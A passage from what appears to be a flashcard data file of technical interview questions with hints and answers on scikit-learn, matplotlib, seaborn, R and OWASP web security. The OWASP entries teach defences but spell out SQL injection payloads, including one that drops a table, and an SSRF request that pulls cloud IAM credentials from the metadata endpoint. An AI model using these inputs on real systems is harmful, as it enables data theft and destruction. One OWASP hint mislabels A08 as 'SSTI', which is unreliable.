      { q:"What is scikit-learn's estimator API and how does it enable interoperability?", hint:"Estimator: fit(X,y). Transformer: fit, transform, fit_transform. Predictor: fit, predict, predict_proba. Consistent interface enables Pipeline, GridSearchCV, cross_val_score to work with any conforming object.", answer:`scikit-learn defines a consistent API contract that all estimators follow, enabling the ecosystem of tools (Pipeline, GridSearchCV, cross_val_score, feature_importances_) to work with any conforming object. The three interfaces: Estimator implements fit(X, y) - learns parameters from data and stores them as attributes ending with underscore (coef_, feature_importances_). Transformer additionally implements transform(X) and fit_transform(X) - encodes or scales data. Predictor additionally implements predict(X) and optionally predict_proba(X) for probabilistic outputs and score(X, y) returning the default metric (R² for regression, accuracy for classification). get_params() and set_params() enable GridSearchCV to programmatically explore hyperparameters. Writing a custom estimator: subclass BaseEstimator and the relevant mixin (TransformerMixin, ClassifierMixin, RegressorMixin), implement fit and transform/predict, use check_estimator() to validate API compliance. This contract is why Pipeline([('scaler', StandardScaler()), ('clf', SVC())]) works - Pipeline only requires that intermediate steps implement fit_transform and the final step implements fit and predict. Any third-party library (XGBoost, LightGBM, CatBoost) that follows this API integrates seamlessly.` },
    ],
    matplotlib: [
      { q:"What is the difference between matplotlib's pyplot interface and the object-oriented Axes API?", hint:"pyplot: global state, plt.plot() implicitly acts on current figure/axes. OO API: explicit Figure and Axes objects, recommended for non-trivial plots and embedding. plt.subplots() bridges both.", answer:`matplotlib has two usage styles. The pyplot interface (import matplotlib.pyplot as plt) maintains global state - plt.plot(), plt.xlabel(), plt.title() implicitly act on the "current" figure and axes. Convenient for quick interactive plots but fragile in scripts with multiple figures or when embedding in applications, because the global state makes it unclear which figure is being modified. The object-oriented API is explicit: fig, ax = plt.subplots() returns a Figure and one or more Axes objects. All operations are method calls on these objects: ax.plot(), ax.set_xlabel(), ax.set_title(). This is the recommended pattern for production code because it is unambiguous, composable, and testable. plt.subplots() is the standard bridge - it creates the Figure and Axes using pyplot internally but returns explicit handles for OO use. For multi-panel figures: fig, axes = plt.subplots(2, 3, figsize=(12, 8)) returns a 2Ã—3 array of Axes. When embedding matplotlib in GUIs (Tkinter, Qt) or web apps, you must use the OO API - you create a Figure directly (fig = Figure()), attach a canvas (FigureCanvasTkAgg), and draw to specific Axes.` },
      { q:"How do you create complex multi-panel figures with shared axes and custom layouts?", hint:"plt.subplots(sharex, sharey). GridSpec for unequal panels. add_subplot. tight_layout() or constrained_layout=True to prevent label clipping.", answer:`For equal-sized panels plt.subplots(nrows, ncols, sharex='col', sharey='row') creates a grid and links axes so zooming one panel updates all sharing the same row/column. sharex='all' links all panels. For unequal panel sizes, GridSpec provides fine-grained control: gs = fig.add_gridspec(3, 3); ax1 = fig.add_subplot(gs[0, :]); ax2 = fig.add_subplot(gs[1, :2]); ax3 = fig.add_subplot(gs[1:, 2]). GridSpecFromSubplotSpec allows nested grids. subplot_mosaic (matplotlib 3.3+) accepts a string layout: fig, axes = plt.subplot_mosaic("AAB\nCCB") creating named axes - more readable than index arithmetic. Label management: tight_layout() adjusts subplot parameters to prevent labels overlapping, but can fail with complex layouts. constrained_layout=True on the Figure is more robust: fig, ax = plt.subplots(constrained_layout=True). Inset axes: ax.inset_axes([x0, y0, width, height]) as a fraction of the parent axes - useful for zoom-in panels or adding a small legend plot.` },
      { q:"How do you produce publication-quality matplotlib figures?", hint:"rcParams for global style. figsize in inches at target DPI. Vector formats (PDF/SVG) for print. plt.style.use. Font sizes, linewidths, tick params. savefig(bbox_inches='tight', dpi=300).", answer:`Publication-quality figures require deliberate control over every visual element. Figure size: set figsize in inches matching the journal column width (single column ~ 3.5 in, double column ~ 7 in) and use dpi=300 for raster exports. For print publications, use vector formats: fig.savefig('figure.pdf') or '.svg' - infinitely scalable with no pixelation. Font sizes: body text in papers is typically 10-11pt; axis labels should match or be slightly smaller. Set globally with plt.rcParams['font.size'] = 10 or use a style sheet. plt.style.use('seaborn-v0_8-paper') or a custom .mplstyle file sets consistent defaults across all figures in a project. Tick parameters: ax.tick_params(labelsize=9, direction='in', length=4) - inward ticks are a common journal requirement. Linewidths: increase from the default 1.5 to 2.0 for lines that will be printed small. Color: use colorblind-safe palettes (matplotlib's 'tab10' default is not fully colorblind-safe; use Okabe-Ito or viridis). Saving: fig.savefig('out.pdf', bbox_inches='tight', dpi=300) - bbox_inches='tight' prevents axis labels being clipped. Maintain an rcParams dict or .mplstyle file in your project repository so all figures in a paper share identical style.` },
      { q:"What is matplotlib's Artist hierarchy and how does it relate to rendering?", hint:"Figure > Axes > Artist (Line2D, Patch, Text, Collection). Each Artist has a draw() method called by the Renderer. zorder controls layering. Backends (Agg, Qt, SVG) implement the Renderer.", answer:`matplotlib's rendering model is built on Artists - every visible element is an Artist with a draw(renderer) method. The hierarchy: Figure contains Axes (and other Artists like suptitle). Axes contains all the plot elements - Line2D objects (from ax.plot), Patch objects (Rectangle, Circle from ax.bar, ax.fill), Text objects (labels, titles), Collections (PathCollection from ax.scatter, PolyCollection from ax.fill_between). When you call fig.savefig() or the canvas draws, it traverses the Artist tree calling draw() on each in zorder sequence. zorder controls layering: artists with higher zorder are drawn on top. ax.plot(..., zorder=3) over ax.bar(..., zorder=2) ensures the line appears above the bars. Backends implement the Renderer interface: the Agg backend renders to a raster PNG buffer using the Anti-Grain Geometry library; SVG/PDF backends emit vector graphics; Qt/Tk backends render to GUI widgets. Interactive backends also handle mouse/keyboard events. Understanding this hierarchy helps with advanced customisation: you can access fig.get_children() to traverse Artists, modify properties programmatically (line.set_linewidth(2.5) after the fact), and write custom Artists by subclassing Artist and implementing draw().` },
      { q:"How do you use colormaps effectively in matplotlib for continuous and categorical data?", hint:"Continuous: sequential (viridis), diverging (RdBu) centred at midpoint, perceptually uniform. Categorical: qualitative palettes (tab10, Set2). Normalise with Normalize/LogNorm. Colorbar via plt.colorbar().", answer:`Colormap choice dramatically affects how data is perceived. For sequential data (0 -> max): use perceptually uniform colormaps - viridis, plasma, inferno, cividis. These are designed so equal steps in data produce equal-appearing steps in colour and remain interpretable when printed in greyscale or by colorblind viewers. Avoid jet/rainbow - it has perceptual non-uniformities and false gradients. For diverging data (negative -> 0 -> positive): use RdBu, coolwarm, or bwr, centred at zero using TwoSlopeNorm: norm = TwoSlopeNorm(vmin=-5, vcenter=0, vmax=20); ax.scatter(x, y, c=z, norm=norm, cmap='RdBu'). For categorical data: qualitative palettes (tab10, Set2, Paired) with distinct hues and no implied order. LogNorm scales data logarithmically before mapping to colours - essential for data spanning several orders of magnitude. BoundaryNorm maps specific value ranges to discrete colour bands. Colorbar: plt.colorbar(scatter_handle, ax=ax, label='Value') - always label it with units. Custom colormaps: matplotlib.colors.LinearSegmentedColormap.from_list('mymap', ['blue', 'white', 'red']) creates a custom diverging map.` },
      { q:"How do you create animated visualisations in matplotlib?", hint:"FuncAnimation(fig, update_func, frames, interval). update_func modifies Artists in place and returns them. blit=True redraws only changed artists. Save with FFMpegWriter or PillowWriter.", answer:`matplotlib.animation.FuncAnimation creates animations by repeatedly calling an update function and capturing each frame. The pattern: define the figure and initial artists (line, = ax.plot([], [])); write an update(frame) function that modifies the artists' data and returns them as a tuple; pass these to FuncAnimation(fig, update, frames=100, interval=50, blit=True). blit=True optimises rendering by redrawing only the artists returned by update rather than the entire figure - requires update to return all modified artists. For init_func: provide a function that resets artists to their initial state, used when the animation repeats. Saving: ani.save('animation.mp4', writer=FFMpegWriter(fps=20)) requires FFmpeg installed. ani.save('animation.gif', writer=PillowWriter(fps=15)) for GIFs without FFmpeg. In Jupyter: from IPython.display import HTML; HTML(ani.to_jshtml()) embeds an interactive player. For data-driven animations (updating a scatter plot colour/position), update the offsets and array attributes: scat.set_offsets(new_xy); scat.set_array(new_colours). ArtistAnimation is an alternative that pre-renders a list of frame snapshots - simpler but less memory-efficient for long animations.` },
      { q:"How do you customise tick formatting, grid lines, and axis scales in matplotlib?", hint:"ax.xaxis.set_major_formatter, set_major_locator. LogScale, SymLogScale. ax.grid(which='both'). Spine visibility. FuncFormatter for custom labels.", answer:`Tick control uses the Locator/Formatter pattern. Locators determine tick positions: MultipleLocator(5) places ticks every 5 units; MaxNLocator(nbins=6) picks at most 6 clean tick positions automatically; LogLocator for log-scale axes; FixedLocator([0, 1, 5, 10]) for explicit positions. Formatters control tick labels: FormatStrFormatter('%.2f') for fixed decimal; FuncFormatter(lambda x, pos: f'{x/1000:.1f}K') for custom transformations (e.g., displaying 50000 as "50K"); DateFormatter('%Y-%m') for datetime axes. Apply with ax.xaxis.set_major_locator(MultipleLocator(10)); ax.xaxis.set_major_formatter(FuncFormatter(...)). Minor ticks: ax.xaxis.set_minor_locator(AutoMinorLocator(5)) adds 5 minor ticks between each major tick; ax.tick_params(which='minor', length=3). Grid: ax.grid(True, which='major', linestyle='--', alpha=0.5); ax.grid(True, which='minor', linestyle=':', alpha=0.3). Axis scales: ax.set_xscale('log') - LogScale; ax.set_yscale('symlog', linthresh=1) - SymLog handles data crossing zero. Spines: ax.spines['top'].set_visible(False) removes the top border for a cleaner academic look.` },
    ],
    seaborn: [
      { q:"What is seaborn's relationship to matplotlib, and when should you use one vs the other?", hint:"Seaborn wraps matplotlib: all seaborn plots return matplotlib Axes and can be customised with matplotlib methods. Seaborn for statistical plots with less code. Matplotlib for fine-grained custom visualisations.", answer:`Seaborn is a statistical data visualisation library built on top of matplotlib. Every seaborn plot ultimately creates matplotlib Figure and Axes objects, so the full matplotlib API is available for customisation after the seaborn call. sns.histplot(data=df, x='age') returns an Axes object; you can then call ax.set_xlabel('Age (years)') or any matplotlib method on it. When to use seaborn: when you need statistical visualisations with minimal code - distributions (histplot, kdeplot, ecdfplot), relationships (scatterplot with regression, pairplot), categorical comparisons (boxplot, violinplot, barplot with CI). Seaborn handles grouping by hue/style/size automatically and applies attractive default themes. When to use matplotlib directly: when you need full control over every visual element, custom artist types not in seaborn, subplots with complex layouts, or embedded visualisations in applications. In practice, a common workflow is to use seaborn to create the base statistical plot and then apply matplotlib calls to polish it - adjusting tick sizes, adding custom annotations, or modifying legend placement. Seaborn also provides a higher-level Figure API (FacetGrid, PairGrid, JointGrid) that manages multi-panel layouts automatically.` },
      { q:"Explain the difference between seaborn Figure-level and Axes-level functions.", hint:"Axes-level: sns.scatterplot() returns Axes, works in existing subplots. Figure-level: sns.relplot() creates its own Figure and FacetGrid, supports col/row faceting. Figure-level wraps Axes-level.", answer:`seaborn has two function levels that differ in how they manage the figure. Axes-level functions (scatterplot, lineplot, histplot, boxplot, barplot) return a matplotlib Axes object and plot into the current axes or the axes you pass via ax=. They integrate seamlessly into multi-panel matplotlib layouts: fig, axes = plt.subplots(1, 2); sns.histplot(data, x='age', ax=axes[0]); sns.boxplot(data, x='group', y='score', ax=axes[1]). Figure-level functions (relplot, displot, catplot, lmplot) create their own Figure and FacetGrid internally - you cannot pass an ax= argument. Their advantage is the col= and row= parameters for automatic faceting: sns.relplot(data=df, x='x', y='y', col='category') creates a separate panel for each unique value of 'category'. The return value is a FacetGrid, not an Axes - customise it with g.set_axis_labels(), g.set_titles(), g.fig.suptitle(). Each Figure-level function wraps a corresponding Axes-level function: relplot wraps scatterplot/lineplot, displot wraps histplot/kdeplot, catplot wraps boxplot/violinplot/barplot. Rule of thumb: use Figure-level for multi-facet exploratory analysis; use Axes-level when integrating seaborn into a larger matplotlib figure layout.` },
      { q:"How do seaborn's statistical aggregation functions (barplot, lineplot) work?", hint:"By default, seaborn computes the mean and 95% CI (bootstrapped) for each category. estimator parameter controls the aggregation function. errorbar parameter controls the error representation (ci, sd, se, pi).", answer:`seaborn's barplot and lineplot automatically aggregate data when given a categorical x-axis and numeric y. By default, they compute the mean of y for each x group and display a 95% bootstrap confidence interval as error bars. This means sns.barplot(data=df, x='group', y='score') does not just plot each row - it computes the mean score per group and estimates uncertainty. Key parameters: estimator controls the aggregation function (default np.mean; use np.median for skewed data, len to count). errorbar controls error representation: 'ci' for confidence interval (default), 'sd' for standard deviation, 'se' for standard error, 'pi' for prediction interval; errorbar=None removes error bars entirely. n_boot controls bootstrap resampling iterations (default 1000) - reduce for speed during exploration. For lineplot with a continuous x-axis or time series: seaborn aggregates y values at each unique x, showing the mean line and shaded confidence band. To plot individual data points rather than aggregates, use scatterplot or add dots=True to stripplot/swarmplot overlaid on a boxplot. Understanding these defaults prevents misinterpretation - a short confidence interval signals high certainty about the mean, not low data variance.` },
      { q:"How does seaborn's FacetGrid work for multi-dimensional exploratory analysis?", hint:"FacetGrid(data, col, row, hue) sets up the grid. g.map(plt_func, 'x', 'y') or g.map_dataframe(sns_func, x='col'). Figure-level functions like relplot use FacetGrid internally.", answer:`FacetGrid enables small-multiples visualisation - the same plot type repeated across subsets of the data. Instantiation: g = sns.FacetGrid(df, col='education', row='gender', hue='smoker', height=3, aspect=1.5). col creates columns for each unique value of the column variable; row creates rows; hue adds colour coding within each panel. g.map(plt.scatter, 'income', 'spending') calls plt.scatter on each panel's subset with positional columns. g.map_dataframe(sns.kdeplot, x='income', fill=True) passes the panel's dataframe subset as the data argument - necessary for seaborn functions that expect a data= keyword. g.add_legend() adds a shared legend for the hue variable. Customisation: g.set_axis_labels('Income ($)', 'Spending ($)'); g.set_titles(col_template='{col_name} Education'); g.tight_layout(). FacetGrid shines for exploratory data analysis: visualising whether a relationship (e.g., income vs spending) differs across demographic subgroups, or whether a distribution changes over time periods. Figure-level functions like relplot, displot, and catplot are convenience wrappers that construct a FacetGrid internally, so their col=, row=, and hue= parameters map directly to FacetGrid arguments.` },
      { q:"How do you use seaborn for correlation and distribution analysis?", hint:"pairplot: pairwise relationships. heatmap with annot=True for correlation matrix. jointplot: bivariate distribution with marginals. clustermap: hierarchical clustering of rows/columns.", answer:`seaborn provides specialised plots for understanding structure in multivariate data. pairplot(df, hue='species', diag_kind='kde') creates a grid of all pairwise scatter plots with KDE density plots on the diagonal - immediately reveals clusters, correlations, and outliers across all feature pairs. For a correlation matrix: corr = df.corr(); sns.heatmap(corr, annot=True, fmt='.2f', cmap='coolwarm', center=0, square=True, vmin=-1, vmax=1) - annot=True overlays the correlation values; center=0 ensures the diverging colormap is centred at zero correlation. jointplot(data=df, x='height', y='weight', kind='reg') plots the bivariate scatter with a regression line and univariate distributions on each margin - kind can be 'scatter', 'kde', 'hist', 'hex', or 'reg'. clustermap applies hierarchical clustering to both rows and columns of a matrix and displays the result as a heatmap with dendrograms - useful for gene expression data, feature correlation matrices, or user-behaviour heatmaps to discover natural groupings. clustermap(corr, figsize=(10,10), method='ward') uses Ward linkage for clustering.` },
      { q:"How do you customise seaborn themes and colour palettes?", hint:"sns.set_theme(style, context, palette). style: whitegrid, darkgrid, white, ticks, dark. context: paper, notebook, talk, poster (scales element sizes). palette: named, custom, or ColorBrewer.", answer:`seaborn provides a layered theming system. sns.set_theme(style='whitegrid', context='notebook', palette='muted') applies globally. style controls the background and grid: 'darkgrid' (default seaborn look with grey background and white gridlines), 'whitegrid' (white background with grey gridlines - popular for publication), 'white' (clean, no grid), 'ticks' (axis ticks only), 'dark' (dark background for presentations). context scales the size of plot elements relative to the viewing context: 'paper' (smallest labels/lines for journals), 'notebook' (default), 'talk' (larger for presentations), 'poster' (largest). This is the correct way to scale a figure for different outputs without manually changing every font size. palette controls the default colour cycle. Named palettes: 'deep', 'muted', 'bright', 'pastel', 'dark', 'colorblind' - 'colorblind' is the most accessible choice. ColorBrewer palettes: 'Set2', 'Paired', 'Blues'. Custom: sns.color_palette(['#1f77b4', '#ff7f0e', '#2ca02c']). For continuous data: sns.color_palette('viridis', as_cmap=True). sns.set_palette('colorblind') changes only the palette without resetting other theme settings. Use sns.axes_style() as a context manager to apply a style to a single plot without affecting others.` },
      { q:"Explain how seaborn works with tidy (long-format) data versus wide-format data.", hint:"Seaborn natively expects tidy data: one row per observation, variables in columns, hue/col/row map to categorical columns. pd.melt() converts wide to long. Some functions accept wide directly.", answer:`seaborn is designed around tidy data principles (Wickham, 2014): each row is one observation, each column is one variable. This format enables the hue=, col=, and row= parameters to map directly to categorical columns without manual subsetting. Example: a dataframe with columns [subject_id, condition, response_time, accuracy] is tidy - sns.lineplot(data=df, x='condition', y='response_time', hue='subject_id') works immediately. Wide-format data has one row per subject with separate columns for each condition: [subject_id, condition_A, condition_B, condition_C]. To use seaborn, melt it: df_long = df.melt(id_vars='subject_id', var_name='condition', value_name='response_time'). pd.melt() is the primary tool; pd.wide_to_long() handles more complex column naming patterns. Some seaborn functions accept wide format directly: sns.heatmap() expects a 2D DataFrame (rows Ã— columns matrix); sns.pairplot() operates on wide format with each column as a variable. sns.lineplot() also accepts wide format and plots each column as a separate line with column names as legend labels - useful for time series with multiple variables. However, for any plot requiring hue/col/row grouping, tidy format is required.` },
    ],
    'r language': [
      { q:"What are R's core data structures and when do you use each?", hint:"Vector (atomic, 1D). List (recursive, heterogeneous). Matrix/Array (2D+, atomic). Data frame (tabular, list of equal-length vectors). Factor (categorical with levels). tibble: modern data frame.", answer:`R has five core data structures. Atomic vectors are the foundation - all elements must be the same type (logical, integer, double, character, complex). c(1, 2, 3) creates a numeric vector. Vectorised operations apply element-wise without loops: x * 2 doubles every element. Lists are recursive and heterogeneous - each element can be any R object including another list. list(name='Alice', scores=c(90, 85), metadata=list(year=2024)) models nested structures. Lists are the basis for all complex objects in R (lm() returns a list). Matrices are 2D atomic vectors - all elements same type. matrix(1:9, nrow=3) with vectorised linear algebra via %*% for matrix multiplication. Data frames are lists of equal-length vectors where each vector is a column - the primary tabular structure. Columns can be different types (numeric, character, logical). tibble (tidyverse) is a modern data frame with better printing, no partial matching on $, and no implicit string-to-factor coercion. Factors store categorical variables with a fixed set of levels - essential for correct treatment in statistical models (contrast coding) and ordered factors for ordinal data. Type coercion hierarchy: logical -> integer -> double -> character - R silently coerces to the most general type when combining.` },
      { q:"How does R's dplyr package implement data manipulation, and what are its key verbs?", hint:"filter, select, mutate, summarise, group_by, arrange, join. Pipe operator %>% or |>. Lazy evaluation with data masking. Operates on data frames and tibbles.", answer:`dplyr provides a grammar of data manipulation with six core verbs that cover most analytical transformations. filter() subsets rows by condition: filter(df, age > 25, country == 'UK') - multiple conditions are ANDed. select() picks columns: select(df, name, age, starts_with('score_')). mutate() adds or modifies columns: mutate(df, bmi = weight / height^2, age_group = case_when(age < 30 ~ 'young', age < 60 ~ 'middle', TRUE ~ 'senior')). summarise() collapses rows to summary statistics: summarise(df, mean_age = mean(age), n = n()). group_by() creates grouped operations - group_by(df, department) %>% summarise(avg_salary = mean(salary)) computes the mean salary per department. arrange() sorts rows: arrange(df, desc(salary)). join verbs: left_join, inner_join, full_join, anti_join - similar to SQL. The pipe operator %>% (magrittr) or the native |> (R 4.1+) chains operations left-to-right: df %>% filter(active) %>% group_by(dept) %>% summarise(n = n()) %>% arrange(desc(n)). Data masking (tidy evaluation) allows column names to be used directly as unquoted symbols inside dplyr verbs - filter(df, age > 25) works without df$age. This requires the rlang embracing operator {{ }} when writing functions that pass column names as arguments.` },
      { q:"Explain ggplot2's grammar of graphics and how layers build a complete plot.", hint:"ggplot(data, aes()) + geom_*() + stat_*() + scale_*() + facet_*() + theme(). Each layer adds a visual representation. aes() maps variables to aesthetics. Geoms render the data.", answer:`ggplot2 implements Wilkinson's Grammar of Graphics - a plot is constructed by layering components rather than calling a single plot function. The structure: ggplot(data = df, aes(x = income, y = spending, colour = region)) initialises the plot, binding data and aesthetic mappings (aes maps data variables to visual properties: x, y, colour, fill, size, shape, alpha). geom_point() adds a scatter plot layer using those aesthetics. Each geom has a default stat: geom_histogram() applies stat_bin by default; geom_smooth() applies stat_smooth (regression). Layers accumulate with +: ggplot(df, aes(x, y)) + geom_point(alpha=0.3) + geom_smooth(method='lm', se=TRUE) + facet_wrap(~category) + scale_colour_brewer(palette='Set2') + labs(title='Income vs Spending', x='Income ($k)', y='Spending ($k)') + theme_minimal(). scale_*() functions control how aesthetic values are mapped to visual output: scale_x_log10() applies a log scale; scale_fill_manual(values=c(...)) uses custom colours. facet_wrap(~variable) creates small multiples. theme() controls all non-data elements: fonts, background, gridlines, legend position. This compositional approach makes plots highly customisable and the code readable.` },
      { q:"How do you write R functions, and what is lexical scoping?", hint:"function(args) { body }. Lexical scoping: variables resolved in the environment where the function was defined, not called. Closures capture enclosing environment. <<- for parent assignment.", answer:`R functions are first-class objects: f <- function(x, y = 2) { x^y }. Arguments can have defaults and are lazily evaluated (computed only when used). ... (dots) passes variable arguments to inner functions: wrapper <- function(...) mean(..., na.rm = TRUE). R uses lexical scoping (static scoping) - when a name is used inside a function, R looks it up in the environment where the function was defined, then its enclosing environments, up to the global environment and finally the base/package namespaces. This means a function "closes over" its defining environment and can access variables from the enclosing scope even after that scope has returned - creating closures: make_adder <- function(n) function(x) x + n; add5 <- make_adder(5); add5(3) returns 8. The operator <<- assigns to the parent environment (the one above the function's local environment) rather than creating a local variable - used in closures to maintain state, though environments (new.env()) or R6 classes are cleaner for stateful objects. Debugging tools: traceback() shows the call stack after an error; browser() inserts an interactive breakpoint; debug(f) enters debug mode for function f; options(error = recover) opens an interactive inspector on any error.` },
      { q:"How do you perform statistical modelling in R?", hint:"lm() for linear regression. glm() for GLMs (logistic, Poisson). summary(), coef(), confint(), predict(). Model formula syntax: y ~ x1 + x2 + x1:x2. lme4 for mixed models.", answer:`R's formula interface y ~ x1 + x2 specifies models declaratively. lm(salary ~ years_exp + education, data = df) fits a linear regression. summary(model) shows coefficients with t-statistics and p-values, R², F-statistic. coef(model) extracts coefficients; confint(model) gives confidence intervals; predict(model, newdata = df_new) generates predictions; predict(model, newdata, interval='confidence') adds confidence bands. Diagnostics: plot(model) generates four diagnostic plots (residuals vs fitted, Q-Q plot, scale-location, leverage) - essential for checking homoscedasticity, normality of residuals, and influential observations. GLMs handle non-normal responses: glm(default ~ balance + income, family = binomial, data = df) fits logistic regression; family = poisson for count data. The link function and variance function are specified by family. Mixed-effects models (lme4): lmer(score ~ time + (1 + time | subject), data = df) fits a random intercept and slope per subject, accounting for within-subject correlation. anova(model1, model2) performs likelihood ratio tests for nested model comparison. AIC(model1, model2) compares non-nested models. The broom package provides tidy(), glance(), augment() to convert model objects to data frames for downstream analysis with dplyr/ggplot2.` },
      { q:"What is the tidyverse philosophy and how does it differ from base R?", hint:"Tidyverse: consistent API, tidy data, pipes, non-standard evaluation. Base R: stable, no dependencies, performance-critical code. Tidyverse for data analysis workflows, base R for package internals and performance.", answer:`The tidyverse is an opinionated collection of packages (dplyr, tidyr, ggplot2, purrr, readr, tibble, stringr, forcats) designed around consistent principles: tidy data (one row = one observation, one column = one variable), a uniform function API, and composability via the pipe. Non-standard evaluation (data masking) lets you refer to column names as bare symbols inside tidyverse functions - more readable but harder to program with dynamically (requires rlang). Base R uses positional subsetting (df[df$age > 25, c('name', 'age')]), which is more explicit and has no dependencies - important for package internals that should not import the entire tidyverse. Performance: data.table is often faster than both for large datasets. The philosophies diverge on verbosity vs explicitness: df %>% filter(age > 25) %>% select(name, age) (tidyverse) vs df[df$age > 25, c('name', 'age')] (base R). Neither is universally better - tidyverse code is more readable for data analysis pipelines; base R is more appropriate for package development where you want minimal dependencies and maximum stability. purrr replaces sapply/lapply with a consistent family: map(list, fn) always returns a list; map_dbl, map_chr, map_lgl return typed vectors - eliminating the unpredictable return types of sapply.` },
      { q:"How do you handle dates, strings, and factors in R's tidyverse?", hint:"lubridate: ymd(), ymd_hms(), interval(), duration(), period(). stringr: str_detect, str_replace, str_extract, regex(). forcats: fct_reorder, fct_lump, fct_relevel for factor manipulation.", answer:`Dates and datetimes: lubridate standardises parsing - ymd('2024-03-15'), mdy('03/15/2024'), dmy_hms('15-03-2024 14:30:00') all parse correctly. Arithmetic uses durations (exact seconds: hours(2), days(1)) or periods (calendar time: months(1) which respects month lengths and DST). interval(start, end) / days(1) computes exact day counts. floor_date(dt, 'month') rounds down to the first of the month - useful for aggregation. String manipulation: stringr provides consistent str_* functions all taking string as the first argument (pipe-friendly). str_detect(x, 'pattern') returns logical; str_extract(x, '\\d+') extracts the first match; str_extract_all for all matches; str_replace(x, 'old', 'new'); str_c(a, b, sep='-') concatenates. All accept fixed() for literal strings or regex() for patterns - regex() is the default. str_glue('Hello {name}, age {age}', name='Alice', age=30) for string interpolation. Factors: forcats handles the pain points of R factors. fct_reorder(f, x) reorders factor levels by the median of x - essential for bar/dot plots sorted by value. fct_lump_n(f, n=5) keeps the 5 most frequent levels and lumps the rest into 'Other'. fct_relevel(f, 'control', after=0) moves 'control' to the first position. fct_rev() reverses level order (useful for horizontal bar charts).` },
    ],
    owasp: [
      { q:"Walk me through the OWASP Top 10 2021 and the primary mitigation for each.", hint:"A01 Broken Access Control. A02 Cryptographic Failures. A03 Injection. A04 Insecure Design. A05 Security Misconfiguration. A06 Vulnerable Components. A07 Auth Failures. A08 SSTI. A09 Logging Failures. A10 SSRF.", answer:`The OWASP Top 10 2021 lists the most critical web application security risks. A01 Broken Access Control (moved to #1): users accessing resources or actions beyond their permissions. Mitigate with deny-by-default, RBAC enforced server-side, and automated access control tests. A02 Cryptographic Failures: sensitive data exposed due to weak or absent encryption. Mitigate by encrypting data at rest (AES-256) and in transit (TLS 1.2+), using bcrypt/Argon2 for passwords, never using MD5/SHA1 for cryptography. A03 Injection (SQL, NoSQL, LDAP, command): attacker-controlled input executed as code. Mitigate with parameterised queries/prepared statements, ORM, input validation, and least-privilege DB accounts. A04 Insecure Design: flaws in the system design itself - no security controls by design. Mitigate with threat modelling, security design patterns, and secure design reviews. A05 Security Misconfiguration: default credentials, open cloud storage, unnecessary features enabled. Mitigate with hardened configurations, infrastructure-as-code, and regular config audits. A06 Vulnerable and Outdated Components: using libraries with known CVEs. Mitigate with SCA tools (Snyk, Dependabot), patch management processes. A07 Identification and Authentication Failures: brute force, weak credentials, session fixation. Mitigate with MFA, strong password policy, secure session management. A08 Software and Data Integrity Failures (new 2021): unsigned updates, insecure deserialization, CI/CD pipeline tampering. A09 Security Logging and Monitoring Failures: insufficient logging enabling attacks to go undetected. A10 SSRF: server making requests to attacker-controlled URLs - mitigate with allowlist of permitted destinations.` },
      { q:"How does SQL Injection work and what are the complete defence layers?", hint:"Input inserted into SQL query without sanitisation. Parameterised queries as primary defence. Stored procedures. ORM. Input validation. WAF. Least-privilege DB user. Error message suppression.", answer:`SQL injection occurs when user-supplied input is concatenated directly into a SQL query: query = "SELECT * FROM users WHERE name = '" + username + "'"; - an attacker enters ' OR '1'='1 and the query returns all users, or '; DROP TABLE users; -- to destroy data. The vulnerability exists in any language where string concatenation builds SQL. Primary defence - parameterised queries (prepared statements): cursor.execute("SELECT * FROM users WHERE name = %s", (username,)) - the database treats the parameter as data, never as SQL syntax, regardless of content. ORMs (SQLAlchemy, Hibernate, Entity Framework) generate parameterised queries by default - the protection is built in. Secondary defences: input validation rejects values that cannot possibly be valid (e.g., a username field should not accept semicolons or quotes); stored procedures encapsulate SQL logic if written with parameters not dynamic SQL; least-privilege database accounts - the application user should only have SELECT/INSERT/UPDATE on required tables, never DROP or access to system tables; suppress detailed error messages in production - a "syntax error near 'OR'" response confirms injection is possible and reveals DB engine; WAF (Web Application Firewall) blocks common injection payloads as a defence-in-depth layer. Test using SQLMap or manual payloads: ' OR 1=1--, ' UNION SELECT 1,2,3--.` },
      { q:"Explain Broken Access Control (OWASP A01) and how you test for it.", hint:"IDOR (Insecure Direct Object Reference): change resource ID in URL. Privilege escalation: access admin endpoints as regular user. Missing function-level access control. Test: authenticated as low-privilege user, manually access privileged URLs/IDs.", answer:`Broken Access Control is the #1 OWASP risk because access control logic is complex and easy to get wrong. Common patterns: IDOR (Insecure Direct Object Reference) - /api/orders/12345 exposes order 12345; changing the ID to 12346 reveals another user's order if the server only checks authentication (is the user logged in?) but not authorisation (does this user own order 12346?). Privilege escalation - a regular user accesses /admin/users or changes their role parameter from 'user' to 'admin' in a JWT or form field. Missing function-level access control - an API endpoint that returns sensitive data has no authorisation check, relying on the UI not to display it. Testing methodology: create two user accounts (A and B). Authenticate as user A, perform actions, and record all resource identifiers. Then authenticated as user B, attempt to access user A's resources by manipulating IDs in URLs, request bodies, and headers. Test every privileged endpoint as a regular user - the response should be 403, not 401 (unauthenticated) or 200 (success). Tools: Burp Suite Repeater to replay requests with modified parameters; Autorize extension for automated IDOR testing; manual review of all authorisation checks in code. Mitigations: centralised access control logic (not scattered if statements); server-side checks on every request; GUID instead of sequential integer IDs (obscurity, not a fix); automated access control tests in CI.` },
      { q:"What is SSRF (Server-Side Request Forgery) and how is it exploited in cloud environments?", hint:"Server fetches URL from user input. Attacker points it to cloud metadata endpoint (169.254.169.254). Retrieves IAM credentials, instance metadata. Mitigate: allowlist outbound URLs, disable metadata v1, use IMDSv2.", answer:`SSRF occurs when an application fetches a user-supplied URL server-side without adequate validation. Classic example: a webhook configuration endpoint or image preview feature where the user provides a URL and the server fetches it. An attacker provides http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name - the AWS instance metadata service (IMDS) endpoint accessible only from within the EC2 instance. The server fetches it and returns the IAM role's temporary credentials (AccessKeyId, SecretAccessKey, Token) to the attacker, enabling them to call AWS APIs with the instance's permissions. Similar attacks work against GCP metadata (metadata.google.internal) and Azure IMDS (169.254.169.254). Cloud-specific impact: if the instance has an overly permissive IAM role (common), the attacker can read S3 buckets, list EC2 instances, access Secrets Manager, or even assume other roles. Capital One breach (2019) involved SSRF against AWS IMDS. Mitigations: URL allowlist - only permit specific known-good domains for outbound requests; disable IMDSv1 and enforce IMDSv2 (requires a session-oriented PUT request with a token, which SSRF cannot easily replicate due to the single-hop requirement); network-level: block outbound connections from the application to 169.254.169.254 via security group rules; avoid having the application server make arbitrary external requests - use a dedicated outbound proxy.` },
